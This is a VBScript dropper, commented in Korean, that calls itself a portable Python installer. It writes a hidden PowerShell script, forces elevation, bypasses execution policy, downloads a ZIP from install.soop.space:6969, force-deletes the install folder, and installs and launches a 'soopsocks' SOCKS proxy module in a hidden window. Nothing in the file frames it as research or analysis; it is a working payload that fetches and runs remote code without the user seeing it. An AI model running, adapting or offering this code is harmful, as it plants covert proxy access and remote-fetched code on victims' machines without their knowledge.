Option Explicit

' === 설정: 서버 ZIP 주소/설치 위치 ===
Const PYTHON_ZIP_URL = "http://install.soop.space:6969/download/py/pythonportable.zip" ' <- 교체
Const INSTALL_DIR    = "C:\PythonPortable"

Dim Wsh, FSO, tempDir, ps1Path, ps, args
Set Wsh = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

tempDir = Wsh.ExpandEnvironmentStrings("%TEMP%")
ps1Path = tempDir & "\pp_bootstrap.ps1"

' --- PowerShell 부트스트랩 스크립트 작성 (무대화면, 최종 실행은 콘솔 표시) ---
ps = ""
ps = ps & "param([string]$PythonZipUrl,[string]$InstallDir='C:\PythonPortable')" & vbCrLf
ps = ps & "$ErrorActionPreference='Stop'" & vbCrLf
ps = ps & "" & vbCrLf
ps = ps & "# UAC 자동 승격" & vbCrLf
ps = ps & "if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {" & vbCrLf
ps = ps & "  Start-Process 'powershell.exe' -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File',""$PSCommandPath"",'-PythonZipUrl',""$PythonZipUrl"",'-InstallDir',""$InstallDir"") -Verb RunAs -WindowStyle Hidden" & vbCrLf
ps = ps & "  exit" & vbCrLf
ps = ps & "}" & vbCrLf
ps = ps & "" & vbCrLf
ps = ps & "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" & vbCrLf
ps = ps & "$zip = Join-Path $env:TEMP 'python-portable.zip'" & vbCrLf
ps = ps & "Invoke-WebRequest -Uri $PythonZipUrl -OutFile $zip" & vbCrLf
ps = ps & "" & vbCrLf
ps = ps & "$destParent = Split-Path -Parent $InstallDir" & vbCrLf
ps = ps & "if (-not $destParent) { $destParent = $InstallDir }" & vbCrLf
ps = ps & "if ($destParent -and !(Test-Path $destParent)) { New-Item -ItemType Directory -Path $destParent | Out-Null }" & vbCrLf
ps = ps & "if (Test-Path $InstallDir) { Remove-Item $InstallDir -Recurse -Force }" & vbCrLf
ps = ps & "try { Expand-Archive -Path $zip -DestinationPath $destParent -Force }" & vbCrLf
ps = ps & "catch {" & vbCrLf
ps = ps & "  Add-Type -AssemblyName System.IO.Compression.FileSystem" & vbCrLf
ps = ps & "  [IO.Compression.ZipFile]::ExtractToDirectory($zip, $destParent, $true)" & vbCrLf
ps = ps & "}" & vbCrLf
ps = ps & "$py = (Get-ChildItem -Path $InstallDir -Recurse -Filter python.exe | Select-Object -First 1).FullName" & vbCrLf
ps = ps & "if (-not $py) { exit 2 }" & vbCrLf
ps = ps & "$workdir = Split-Path -Parent $py" & vbCrLf
ps = ps & "" & vbCrLf
ps = ps & "$quote = [char]34" & vbCrLf
ps = ps & "$bat = Join-Path $env:TEMP 'run_soopsocks.cmd'" & vbCrLf
ps = ps & "$lines = @(" & vbCrLf
ps = ps & "  '@echo off'," & vbCrLf
ps = ps & "  ($quote + $py + $quote + ' -m pip install soopsocks pywin32')," & vbCrLf
ps = ps & "  'if errorlevel 1 goto end'," & vbCrLf
ps = ps & "  ($quote + $py + $quote + ' -m soopsocks')," & vbCrLf
ps = ps & "  ':end'" & vbCrLf
ps = ps & ")" & vbCrLf
ps = ps & "Set-Content -Path $bat -Value $lines -Encoding ASCII" & vbCrLf
ps = ps & "Start-Process cmd.exe -ArgumentList @('/c', $bat) -WorkingDirectory $workdir -WindowStyle Hidden" & vbCrLf

With FSO.CreateTextFile(ps1Path, True)
  .Write ps
  .Close
End With
' --- PowerShell 실행(숨김) ---
args = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1Path & _
       """ -PythonZipUrl """ & PYTHON_ZIP_URL & """ -InstallDir """ & INSTALL_DIR & """"
Wsh.Run "powershell.exe " & args, 0, False  ' 0=창 숨김, 모든 작업 완료 후 자동 종료
